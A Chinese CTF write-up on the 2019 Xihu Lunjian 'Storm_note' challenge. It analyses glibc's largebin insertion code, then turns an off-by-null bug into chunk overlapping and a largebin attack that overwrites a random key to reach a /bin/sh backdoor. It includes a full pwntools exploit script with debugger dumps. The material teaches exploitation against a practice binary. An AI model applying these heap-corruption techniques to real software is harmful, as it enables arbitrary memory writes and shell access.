# xihu-2019-storm-note

https://www.freebuf.com/articles/system/209096.html

## 前言

从西湖论剑的Storm_note第一次接触largebin，RCTF的babyheap，发现这两道题的本质上是一样的，因此我将通过这两道题目对largebin attack进行深入研究，从源码分析到动态调试，将largebin attack的整个流程都过了一遍，整理一下largebin attack的利用过程，希望对大家有帮助。

## malloc函数largebin部分源码分析

首先从源码角度静态分析将chunk从unsortedbin放入largebin部分的代码逻辑。

```c
for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))//从第一个unsortedbin的bk开始遍历,FIFO原则
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
                                   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
          size = chunksize (victim);
          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */
          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))    //unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);                    //将选中的chunk剥离出来，恢复unsortedbin
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }
              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;//将其从unsortedbin中取出来
          bck->fd = unsorted_chunks (av);//bck要保证地址的有效性
          /* Take now instead of binning if exact fit */
          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                set_non_main_arena (victim);
#if USE_TCACHE
              /* Fill cache first, return to user only if cache fills.
                 We may return one of these chunks later.  */
              if (tcache_nb
                  && tcache->counts[tc_idx] < mp_.tcache_count)
                {
                  tcache_put (victim, tc_idx);
                  return_cached = 1;
                  continue;
                }
              else
                {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
                }
#endif
            }
          /* place chunk in bin */
          /*把unsortedbin的chunk放入相应的bin中*/
          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else//large bin
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  /* 如果size<large bin中最后一个chunk即最小的chunk，就直接插到最后*/
                  if ((unsigned long) (size)
                      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;
                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
            // 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。
            // 直到满足size>=large bin chunk size
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;//fd_nextsize指向比当前chunk小的下一个chunk
                          assert (chunk_main_arena (fwd));
                        }
                      if ((unsigned long) size
                          == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else// 插入
                        {
                            //解链操作，nextsize只有largebin才有
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
          mark_bin (av, victim_index);
          //解链操作2,fd,bk
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
          //fwd->bk->fd=victim
```

从源码中可以分析出将chunk(victim)从unsortedbin中取出来放入largebin的具体过程。malloc的时候，遵循FIFO原则，从unsortedbin的链尾开始往前遍历。对每次选中的chunk(代码中为victim)，大致会进行以下操作：

1. 如果申请的大小是smallbin范围内&&victim是unsortedbin中仅剩的一个chunk&&victim的大小满足需求，则利用这个chunk分配给用户返回；否则将这个victim从unsortedbin中脱离出来
2. 除非size刚好是需要的大小，否则将其放入相应的smallbin或largebin
3. 如果是0x400以上(即为largebin)，则从大到小的顺序找到一个链表，该链表的size<=size(victim)，该链表的第一个chunk即为fwd。如果刚好相等，则不对bk_nextsize和fd_nextsize进行操作。
4. 解链操作1（重点关注最后一步）：victim->bk_nextsize->fd_nextsize = victim相当于fwd->bk_nextsize->fd_nextsize=victim，即向fwd->bk_nextsize指针中写入victim的地址。
5. 解链操作2（重点关注最后一步）：bck->fd = victim相当于fwd->bk->fd=victim，即向fwd->bk的指针中写入victim的地址。

largebin attack的关键是最后两个解链操作，如果可以控制fwd的bk_nextsize指针和bk指针，可以实现向任意地址写入victim的地址。

## 2019 西湖论剑 Storm_note

### 漏洞类型

off_by_null

### 背景知识

largebin attack
unlink
chunk overlapping

### 保护机制

```
[*] '/home/leo/pwn/xihu/Storm_note'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程序逻辑

1、init_proc

```c
ssize_t init_proc()
{
  ssize_t result; // rax
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  if ( !mallopt(1, 0) )                         // 禁用fastbin
    exit(-1);
  if ( mmap((void *)0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0xABCD0000LL )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
    exit(-1);
  result = read(fd, (void *)0xABCD0100LL, 0x30uLL);
  if ( result != 48 )
    exit(-1);
  return result;
}
```

程序一开始就对进程进行初始化，mallopt(1, 0)禁用了fastbin，然后通过mmap在0xABCD0000分配了一个页面的可读可写空间，最后往里面写入一个随机数。

2、add

```c
for ( i = 0; i <= 15 && note[i]; ++i )//按顺序存放堆指针
    ;
  if ( i == 16 )
  {
    puts("full!");
  }
  else
  {
    puts("size ?");
    _isoc99_scanf((__int64)"%d", (__int64)&v1);
    if ( v1 > 0 && v1 <= 0xFFFFF )
    {
      note[i] = calloc(v1, 1uLL);//清空内容
      note_size[i] = v1;//0x202060
      puts("Done");
    }
```

首先遍历全局变量note，找到一个没有存放内容的地方保存堆指针。然后限定了申请的堆的大小最多为0xFFFFF，调用calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。

3、edit

```c
puts("Index ?");
  _isoc99_scanf((__int64)"%d", (__int64)&v1);
  if ( v1 >= 0 && v1 <= 15 && note[v1] )//0x2020a0
  {
    puts("Content: ");
    v2 = read(0, note[v1], (signed int)note_size[v1]);
    *((_BYTE *)note[v1] + v2) = 0;              // off_by_null
    puts("Done");
  }
```

存在一个off_by_null漏洞，在read后v2保存写入的字节数，最后在该偏移处的字节置为0，形成off_by_null。

4、delete

```c
puts("Index ?");
  _isoc99_scanf((__int64)"%d", (__int64)&v1);
  if ( v1 >= 0 && v1 <= 15 && note[v1] )
  {
    free(note[v1]);
    note[v1] = 0LL;
    note_size[v1] = 0;
  }
```

正常free

5、backdoor

```c
void __noreturn backdoor()
{
  char buf; // [rsp+0h] [rbp-40h]
  unsigned __int64 v1; // [rsp+38h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("If you can open the lock, I will let you in");
  read(0, &buf, 0x30uLL);
  if ( !memcmp(&buf, (const void *)0xABCD0100LL, 0x30uLL) )
    system("/bin/sh");
  exit(0);
}
```

程序提供一个可以直接getshell的后门，触发的条件就是输入的数据与mmap映射的空间的前48个字节相同。

### 利用思路

根据程序提供的后门，可以通过两种方法来触发：

1. 通过泄露信息来获取写入的随机数
2. 通过实现任意写来改写0xABCD0000地址的48字节随机数成已知的数据。

但这题没有提供输出函数，因此第一种方法不好利用，这里采取第二种方法，实现任意写。这题由于禁用了fastbin，可以考虑使用largebin attack来是实现任意写。

1. 利用off_by_null 漏洞实现chunk overlapping，从而控制堆块内容。
2. 将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack
3. 控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写

### 具体实现

第一步：chunk overlapping

```python
add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6
```

首先分配7个chunk，chunk1和chunk4是用于放入largebin的大chunk，chunk6防止top chunk合并。

```python
edit(1,'a'*0x4f0+p64(0x500))#prev_size
edit(4,'a'*0x4f0+p64(0x500))#prev_size
```

构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。

```
0x55c1a9fc74f0: 0x6161616161616161  0x6161616161616161
0x55c1a9fc7510: 0x6161616161616161  0x0000000000000500
0x55c1a9fc7530: 0x0000000000000000  0x0000000000000000
```

```python
dele(1)
edit(0,'a'*0x18)#off by null
利用off_by_null漏洞改写chunk1的size为0x500
```

```
pwndbg> x/10gx 0x562676627000+0x2020a0
0x56267829a0: 0x0000562678234010  0x0000000000000000
<note+16>:    0x0000562678234540  0x0000562678234560
<note+32>:    0x0000562678234580  0x0000562678234a90
<note+48>:    0x0000562678234ab0  0x0000000000000000
<note+64>:    0x0000000000000000  0x0000000000000000

pwndbg> x/10gx 0x0000562678234010
0x562678234010: 0x6161616161616161  0x6161616161616161
0x562678234020: 0x6161616161616161  0x0000000000000500
0x562678234030: 0x00007f7a2912cb78  0x00007f7a2912cb78
0x562678234040: 0x6161616161616161  0x6161616161616161
```

```python
add(0x18)#1
add(0x4d8)#7 0x050

dele(1)
dele(2)    #overlap
```

```
pwndbg> x/20gx 0x000056215e10b020
0x56215e10b020: 0x6161616161616161  0x0000000000000041
0x56215e10b030: 0x0000000000000000  0x0000000000000000
0x56215e10b040: 0x0000000000006666  0x0000000000000000
...
unsortedbin
all: 0x7fc886a6eb78 (main_arena+88) ← 0x7fc886a6eb78
```

先将0x20的chunk释放掉，然后释放chunk2，这时触发unlink，查可以看到在note中chunk7保存着0x...50的指针，但这一块是已经被释放掉的大chunk，形成堆块的重叠。因此如果申请0x18以上的chunk，就能控制该chunk的内容了。

```python
#recover
add(0x30)#1
add(0x4e0)#2
```

```
pwndbg> x/20gx 0x55c811904000
0x55c811904000: 0x0000000000000000  0x0000000000000021
0x55c811904010: 0x6161616161616161  0x6161616161616161
0x55c811904020: 0x6161616161616161  0x0000000000000531
0x55c811904030: 0x00007fc4a3870b78  0x00007fc4a3870b78
0x55c811904040: 0x0000000000000000  0x0000000000000000
... （中间多行为 0x00）
pwndbg> x/10gx 0x55c8119360d0
<note+48>: 0x000055c811904050  0x0000000000000000
```

申请0x30的chunk，形成chunk overlapping。接下来用同样的方法对第二个大chunk进行overlapping

```python
dele(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
dele(4)
dele(5)#overlap
add(0x40)#4 0x580
edit(8,'ffff')
```

第二步：放入largebin

如何才能触发条件，将unsortedbin中的大chunk放入largebin呢？接下来从源码分析该机制。

```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))//从第一个unsortedbin的bk开始遍历
{
    bck = victim->bk;
    size = chunksize (victim);
    if (in_smallbin_range (nb) &&//<_int_malloc+627>
        bck == unsorted_chunks (av) &&
        victim == av->last_remainder &&
        (unsigned long) (size) > (unsigned long) (nb + MINSIZE))    //unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小
    {remainder_size = size - nb;
     remainder = chunk_at_offset (victim, nb);...}//将选中的chunk剥离出来，恢复unsortedbin
    if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
     unsorted_chunks (av)->bk = bck;    //largebin attack
    //注意这个地方，将unsortedbin的bk设置为victim->bk，如果我设置好了这个bk并且能绕过上面的检查,下次分配就能将target chunk分配出来
    if (size == nb)//size相同的情况同样正常分配
    if (in_smallbin_range (size))//放入smallbin
     {
        victim_index = smallbin_index (size);
        bck = bin_at (av, victim_index);
        fwd = bck->fd;
     }
     else//放入large bin
     {
         while ((unsigned long) size < chunksize_nomask (fwd))
         {
            fwd = fwd->fd_nextsize;//fd_nextsize指向比当前chunk小的下一个chunk
            assert (chunk_main_arena (fwd));
          }
          if ((unsigned long) size
                          == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
             fwd = fwd->fd;
          else// 插入
          {
            //解链操作，nextsize只有largebin才有
            victim->fd_nextsize = fwd;
            victim->bk_nextsize = fwd->bk_nextsize;
            fwd->bk_nextsize = victim;
            victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim
           }
          bck = fwd->bk;
      }
   }
 else
     victim->fd_nextsize = victim->bk_nextsize = victim;
}
 mark_bin (av, victim_index);
//解链操作2,fd,bk
 victim->bk = bck;
 victim->fd = fwd;
 fwd->bk = victim;
 bck->fd = victim;
//fwd->bk->fd=victim
```

```python
dele(2)    #unsortedbin-> chunk2 -> chunk5(0x5c0)    which size is largebin FIFO
add(0x4e8)      # put chunk8(0x5c0) to largebin
dele(2) #put chunk2 to unsortedbin
```

简要总结一下这个过程，在unsortedbin中存放着两个大chunk，第一个0x4e0，第二个0x4f0。当我申请一个0x4e8的chunk时，首先找到0x4e0的chunk，太小了不符合调件，于是将它拿出unsortedbin，放入largebin。在放入largebin时就会进行两步解链操作，两个解链操作的最后一步是关键。

```
unsortedbin
0x4f0        0x4e0
all: 0x5603b3477060 → 0x5603b34775c0 → 0x7fc06b403b78 (main_arena+88)

pwndbg> x/4gx 0x5603b3477060
0x5603b3477060: 0x00000000000004f1  0x00005603b34775c0
0x5603b3477070: 0x0000000000000000  0x0000000000000000

pwndbg> x/4gx 0x5603b34775c0
0x5603b34775c0: 0x00000000000004e1  0x00005603b3477060
0x5603b34775d0: 0x00007fc06b403b78  0x0000000000000000
```

可以看到从unsortedbin->bk开始遍历，第一个的size < nb因此就会放入largebin，继续往前遍历，找到0x4f0的chunk，刚好满足size==nb，因此将其分配出来。最后在delete(2)将刚刚分配的chunk2再放回unsortedbin，进行第二次利用。

```
pwndbg> x/10gx 0x5627f15b8000+0x2020a0
0x5627f15a0b0: 0x0000000000000000  0x00005627f21ab010
<note+16>:     0x0000000000000000  0x00005627f21ab560
<note+32>:     0x00005627f21ab0a0  0x0000000000000000

unsortedbin
all: 0x5627f21ab060 ← 0x7f12e6212b78 (main_arena+88) ← 0x5627f21ab060

largebins
0x400: 0x7f12e6212f68 (main_arena+1096)
0x4a0: 0x7f12e6212f78 (main_arena+1112)
0x4b0: 0x7f12e6212f88 (main_arena+1128)
0x4c0: 0x5627f21ab5c0 → 0x7f12e6212f98 (main_arena+1144)
0x4d0: 0x7f12e6212fa8 (main_arena+1160)
```

第三步：largebin attack

再回顾一下之前源码中更新unsortedbin的地方

```c
bck = victim->bk;
if (__glibc_unlikely (bck->fd != victim))
     malloc_printerr ("malloc(): corrupted unsorted chunks 3");
unsorted_chunks (av)->bk = bck;    //largebin attack
```

```python
content_addr = 0xabcd0100
fake_chunk = content_addr - 0x20

payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
payload += p64(0) + p64(fake_chunk)      # bk
edit(7,payload)
```

```
pwndbg> x/10gx 0x55f42c2a7010
<note+48>: 0x000055f42c2a7050  0x0000000000000000

pwndbg> x/100x 0x000055f42c2a7050
0x55f42c2a7050: 0x0000000000000000  0x0000000000000000
0x55f42c2a7060: 0x0000000000000000  0x00000000000004f1
0x55f42c2a7070: 0x0000000000000000  0x0000000000abcd00e0
0x55f42c2a7080: 0x0000000000000000  0x0000000000000000
```

```python
payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(8,payload2)
```

修改largebin的bk和bk_nextsize

```
pwndbg> x/10gx 0x55bd7645c5a0
0x55bd7645c5a0: 0x0000000000000000  0x0000000000000000
0x55bd7645c5b0: 0x00000000000004e1  0x0000000000abcd00e8
0x55bd7645c5c0: 0x0000000000000000  0x0000000000abcd00c3
```

分析一下为什么改写为这些值。先回顾一下两个解链操作。

```c
            victim->fd_nextsize = fwd;
            victim->bk_nextsize = fwd->bk_nextsize;
            fwd->bk_nextsize = victim;
            victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim
           }
          bck = fwd->bk;
      }
   }
 else
     victim->fd_nextsize = victim->bk_nextsize = victim;
}
 mark_bin (av, victim_index);
//解链操作2,fd,bk
 victim->bk = bck;
 victim->fd = fwd;
 fwd->bk = victim;
 bck->fd = victim;
//fwd->bk->fd=victim
```

根据之前的chunk overlappnig，可以控制largebin的bk和bk_nextsize，fwd就是已经放入largebin的chunk，victim就是unsortedbin中需要放入largebin的chunk。victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim在fwd->bk_nextsize中放入目标的addr，实现*(addr+0x20) = victimbck->fd = victim;在fwd->bk中放入目标addr，实现*(addr+0x10)=victim因为unsortedbin中存放了fake_chunk，但那里没有一个符合条件的size，因此需要通过这个解链操作给那里写入一个地址，作为size。

```
unsortedbin
all: 0x558a54cb3060 → 0x558a54cb35c0 → 0x0

pwndbg> x/8gx 0x558a54cb3060
0x558a54cb3060: 0x00000000000004f1  0x0000558a54cb35c0
0x558a54cb3070: 0x0000000000000000  0x0000000000abcd00e0
```

```
pwndbg> x/10gx 0xABCD0100-0x30
0xabcd00d0: 0x0000000000000000  0x0000000000000000
0xabcd00e0: 0x5294251060000000  0x0000000000000056
0xabcd00f0: 0x00007f0a5f5bbb78  0x0000565294251060
0xabcd0100: 0x35d8c5ba4dbc76cb  0xccd47a9808517e7e
```

```python
(fake_chunk-0x18-5 + 0x20) = (fake_chunk+3) = victim
```

最后能在fake_chunk上写入0x56，而程序开了PIE保护，程序基址有一定几率以0x56开头。

```c
bck->fd = unsorted_chunks (av)
```

同时还要保证bck的地址有效

```python
(fake_chunk+8+0x10)=(fake_chunk+0x18)=victim

add(0x40)
```

```
pwndbg> x/4gx 0x7f28e94b6b78  # unsortedbin
0x7f28e94b6b78 <main_arena+88>:  0x0000558a54cb3ac0  0x0000558a54cb35c0
0x7f28e94b6b88 <main_arena+104>: 0x0000558a54cb3060  0x00000000abcd00e0
```

从unsortedbin的bk开始遍历，发现bk是0xabcd00e0，bck!=unsorted_chunks (av)，因此不会从该chunk中剥离一块内存分配。然后执行一下语句

```c
unsorted_chunks (av)->bk = bck;    
bck->fd = unsorted_chunks (av);
```

将0xabcd00e0->bk重新放入unsortedbin。然后由于size==nb，返回分配，成功将目标地址返回。

```
pwndbg> x/10gx 0x563d6d57a000+0x2020a0
<note+16>: 0x00000000abcd00f0  0x0000563d6d6a0350
<note+32>: 0x0000563d6d6a0380  0x0000000000000000
```

```python
payload = p64(0) * 2+p64(0) * 6
edit(2,payload)

p.sendlineafter('Choice: ','666')

p.send(p64(0)*6)
```

最后将0XABCD0100的随机数修改为0，触发后门即可。

### EXP

```python
from pwn import *
p = process('./Storm_note')

def add(size):
  p.recvuntil('Choice')
  p.sendline('1')
  p.recvuntil('?')
  p.sendline(str(size))

def edit(idx,mes):
  p.recvuntil('Choice')
  p.sendline('2')
  p.recvuntil('?')
  p.sendline(str(idx))
  p.recvuntil('Content')
  p.send(mes)

def dele(idx):
  p.recvuntil('Choice')
  p.sendline('3')
  p.recvuntil('?')
  p.sendline(str(idx))


add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6

edit(1,'a'*0x4f0+p64(0x500))#prev_size
edit(4,'a'*0x4f0+p64(0x500))#prev_size

dele(1)
edit(0,'a'*0x18)#off by null

add(0x18)#1
add(0x4d8)#7 0x050

dele(1)
dele(2)    #overlap

#recover
add(0x30)#1
add(0x4e0)#2

dele(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
dele(4)
dele(5)#overlap
add(0x40)#4 0x580


dele(2)    #unsortedbin-> chunk2 -> chunk5(chunk8)(0x5c0)    which size is largebin FIFO
add(0x4e8)      # put chunk8(0x5c0) to largebin
dele(2) #put chunk2 to unsortedbin


content_addr = 0xabcd0100
fake_chunk = content_addr - 0x20

payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
payload += p64(0) + p64(fake_chunk)      # bk
edit(7,payload)


payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(8,payload2)

add(0x40)
#gdb.attach(p,'vmmap')
payload = p64(0) * 2+p64(0) * 6
edit(2,payload)
p.sendlineafter('Choice: ','666')
p.send(p64(0)*6)
p.interactive()
```
